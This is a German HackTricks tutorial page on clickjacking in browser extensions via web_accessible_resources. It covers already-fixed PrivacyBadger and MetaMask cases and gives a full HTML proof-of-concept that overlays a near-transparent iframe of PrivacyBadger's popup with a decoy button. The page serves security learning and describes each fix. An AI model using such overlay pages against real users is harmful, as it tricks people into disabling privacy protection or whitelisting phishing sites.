# BrowExt - ClickJacking

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Grundlegende Informationen

Diese Seite wird eine ClickJacking-Schwachstelle in einer Browsererweiterung ausnutzen.\
Wenn Sie nicht wissen, was ClickJacking ist, √ºberpr√ºfen Sie:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Erweiterungen enthalten die Datei **`manifest.json`** und diese JSON-Datei hat ein Feld `web_accessible_resources`. Hier ist, was [die Chrome-Dokumentation](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) dazu sagt:

> Diese Ressourcen w√§ren dann √ºber die URL **`chrome-extension://[PACKAGE ID]/[PATH]`** auf einer Webseite verf√ºgbar, die mit der Methode **`extension.getURL`** generiert werden kann. Erlaubte Ressourcen werden mit entsprechenden CORS-Headern bereitgestellt, sodass sie √ºber Mechanismen wie XHR verf√ºgbar sind.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Die **`web_accessible_resources`** in einer Browsererweiterung sind nicht nur √ºber das Web zug√§nglich; sie arbeiten auch mit den inh√§renten Berechtigungen der Erweiterung. Das bedeutet, dass sie die F√§higkeit haben, Folgendes zu tun:

* Den Zustand der Erweiterung √§ndern
* Zus√§tzliche Ressourcen laden
* Mit dem Browser bis zu einem gewissen Grad interagieren

Diese Funktion birgt jedoch ein Sicherheitsrisiko. Wenn eine Ressource innerhalb von **`web_accessible_resources`** eine wesentliche Funktionalit√§t hat, k√∂nnte ein Angreifer diese Ressource m√∂glicherweise in eine externe Webseite einbetten. Unwissende Benutzer, die diese Seite besuchen, k√∂nnten diese eingebettete Ressource versehentlich aktivieren. Eine solche Aktivierung k√∂nnte je nach Berechtigungen und F√§higkeiten der Ressourcen der Erweiterung zu unbeabsichtigten Folgen f√ºhren.

## PrivacyBadger-Beispiel

In der Erweiterung PrivacyBadger wurde eine Schwachstelle identifiziert, die mit dem Verzeichnis `skin/` zusammenh√§ngt, das wie folgt als `web_accessible_resources` deklariert wurde (√úberpr√ºfen Sie den originalen [Blog-Beitrag](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Diese Konfiguration f√ºhrte zu einem potenziellen Sicherheitsproblem. Speziell die Datei `skin/popup.html`, die beim Interagieren mit dem PrivacyBadger-Symbol im Browser gerendert wird, k√∂nnte innerhalb eines `iframe` eingebettet werden. Diese Einbettung k√∂nnte ausgenutzt werden, um Benutzer dazu zu verleiten, versehentlich auf "PrivacyBadger f√ºr diese Website deaktivieren" zu klicken. Eine solche Aktion w√ºrde die Privatsph√§re des Benutzers gef√§hrden, indem der PrivacyBadger-Schutz deaktiviert und der Benutzer m√∂glicherweise verst√§rktem Tracking ausgesetzt w√ºrde. Eine visuelle Demonstration dieses Exploits kann in einem ClickJacking-Video-Beispiel angesehen werden, das unter [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm) bereitgestellt wird.

Um diese Schwachstelle zu beheben, wurde eine einfache L√∂sung implementiert: die Entfernung von `/skin/*` aus der Liste der `web_accessible_resources`. Diese √Ñnderung hat das Risiko effektiv gemindert, indem sichergestellt wurde, dass der Inhalt des `skin/`-Verzeichnisses nicht √ºber webzug√§ngliche Ressourcen abgerufen oder manipuliert werden konnte.

Die Behebung war einfach: **Entfernen Sie `/skin/*` aus den `web_accessible_resources`**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask Beispiel

Ein [**Blog-Beitrag √ºber ein ClickJacking in Metamask finden Sie hier**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). In diesem Fall hat Metamask die Schwachstelle behoben, indem √ºberpr√ºft wurde, dass das Protokoll, das zum Zugriff verwendet wurde, **`https:`** oder **`http:`** war (nicht z.B. **`chrome:`**):

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

**Ein weiteres behobenes ClickJacking** in der Metamask-Erweiterung war, dass Benutzer in der Lage waren, auf **Klicken zum Whitelisten** zu klicken, wenn eine Seite verd√§chtig war, ein Phishing-Versuch zu sein, aufgrund von `‚Äúweb_accessible_resources‚Äù: [‚Äúinpage.js‚Äù, ‚Äúphishing.html‚Äù]`. Da diese Seite anf√§llig f√ºr Clickjacking war, konnte ein Angreifer sie missbrauchen, indem er etwas Normales anzeigte, um das Opfer dazu zu bringen, darauf zu klicken, um es zu whitelisten, ohne es zu bemerken, und dann zur Phishing-Seite zur√ºckzukehren, die dann auf der Whitelist stand.

## Steam Inventory Helper Beispiel

√úberpr√ºfen Sie die folgende Seite, um zu sehen, wie ein **XSS** in einer Browsererweiterung mit einer **ClickJacking**-Schwachstelle verkettet wurde:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Referenzen

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

<details>

<summary><strong>Erfahren Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
